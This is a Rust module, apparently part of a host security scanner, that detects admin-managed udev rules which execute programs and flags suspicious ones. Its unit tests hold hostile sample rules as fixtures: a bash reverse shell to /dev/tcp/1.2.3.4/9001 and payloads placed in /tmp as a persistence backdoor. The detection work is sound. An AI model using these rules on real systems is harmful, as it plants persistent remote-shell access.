//! udev rules that execute programs.
//!
//! A udev rule can run a command whenever a device event fires, which an
//! attacker can trigger on demand. Distribution rules under `/lib` and
//! `/usr/lib` use `RUN+=` heavily and legitimately, so only admin-managed
//! rules in `/etc/udev/rules.d` are reported, and only when what they run
//! looks wrong.

use std::path::{Path, PathBuf};

use crate::core::scan::{
    effective_line, read_text_files, references_untrusted_dir, suspicious_matches,
};
use crate::core::{DefenderContext, Result};

/// Admin-managed rules. Distribution directories are deliberately excluded.
const RULES_DIR: &str = "/etc/udev/rules.d";

/// A udev rule that executes a program on a device event.
pub struct Rule {
    /// Rules file the rule appears in.
    pub file: PathBuf,
    /// The full rule.
    pub line: String,
    /// The command it runs.
    pub command: String,
    /// Why the command looks dangerous; empty if nothing matched.
    pub reasons: Vec<&'static str>,
}

/// Report admin-managed udev rules that execute a program.
pub fn run(ctx: &DefenderContext) -> Result {
    let dir = Path::new(RULES_DIR);
    if !dir.is_dir() {
        println!("[✓] {} does not exist", RULES_DIR);
        return Ok(());
    }

    let files = read_text_files(dir);
    ctx.debug(&format!("Read {} udev rule file(s)", files.len()));

    let mut executing = Vec::new();
    for (path, contents) in &files {
        for (line, command) in executing_rules(contents) {
            let mut reasons = suspicious_matches(&command);
            if references_untrusted_dir(&command) {
                reasons.push("runs from a world-writable directory");
            }
            executing.push(Rule {
                file: path.clone(),
                line,
                command,
                reasons,
            });
        }
    }

    if executing.is_empty() {
        println!("[✓] No udev rules in {} execute programs", RULES_DIR);
        return Ok(());
    }

    let flagged = executing.iter().filter(|r| !r.reasons.is_empty()).count();
    println!(
        "[+] {} rule(s) in {} execute a program, {} flagged:",
        executing.len(),
        RULES_DIR,
        flagged
    );

    for rule in &executing {
        println!("    {}", rule.file.display());
        println!("      {}", rule.line);
        println!("      runs: {}", rule.command);
        if !rule.reasons.is_empty() {
            println!("      [!] {}", rule.reasons.join(", "));
        }
    }
    println!("[!] udev rules are not auto-removed — a wrong deletion can break devices.");

    Ok(())
}

/// Rules that execute something, as (full line, extracted command).
fn executing_rules(contents: &str) -> Vec<(String, String)> {
    contents
        .lines()
        .filter_map(effective_line)
        .filter_map(|line| extract_command(line).map(|cmd| (line.to_string(), cmd)))
        .collect()
}

/// The command a rule runs, from `RUN+=`, `RUN=`, `PROGRAM=`, or
/// `IMPORT{program}=`. Returns `None` for rules that only match or relabel.
fn extract_command(line: &str) -> Option<String> {
    const KEYS: &[&str] = &["RUN+=", "RUN=", "PROGRAM=", "IMPORT{program}="];

    for key in KEYS {
        if let Some(rest) = line.split(key).nth(1) {
            let rest = rest.trim_start();
            let quote = rest.chars().next()?;
            if quote != '"' && quote != '\'' {
                continue;
            }
            if let Some(end) = rest[1..].find(quote) {
                return Some(rest[1..1 + end].to_string());
            }
        }
    }

    None
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_matching_only_rule_runs_nothing() {
        let rule = r#"SUBSYSTEM=="net", ACTION=="add", NAME="eth0""#;
        assert_eq!(extract_command(rule), None);
    }

    #[test]
    fn extracts_a_run_command() {
        let rule = r#"ACTION=="add", RUN+="/usr/bin/logger device added""#;
        assert_eq!(
            extract_command(rule),
            Some("/usr/bin/logger device added".to_string())
        );
    }

    #[test]
    fn extracts_a_program_command() {
        let rule = r#"SUBSYSTEM=="block", PROGRAM="/sbin/blkid -o value""#;
        assert_eq!(
            extract_command(rule),
            Some("/sbin/blkid -o value".to_string())
        );
    }

    #[test]
    fn handles_single_quotes() {
        let rule = r#"ACTION=="add", RUN+='/tmp/payload'"#;
        assert_eq!(extract_command(rule), Some("/tmp/payload".to_string()));
    }

    #[test]
    fn a_payload_in_tmp_is_flagged() {
        let rules = r#"ACTION=="add", RUN+="/tmp/.backdoor""#;
        let found = executing_rules(rules);

        assert_eq!(found.len(), 1);
        assert!(references_untrusted_dir(&found[0].1));
    }

    #[test]
    fn a_reverse_shell_rule_is_flagged() {
        let rules = r#"ACTION=="add", RUN+="/bin/bash -c 'bash -i >& /dev/tcp/1.2.3.4/9001 0>&1'""#;
        let found = executing_rules(rules);

        assert_eq!(found.len(), 1);
        assert!(!suspicious_matches(&found[0].1).is_empty());
    }

    #[test]
    fn comments_are_ignored() {
        assert!(executing_rules("# RUN+=\"/tmp/evil\"\n").is_empty());
    }
}
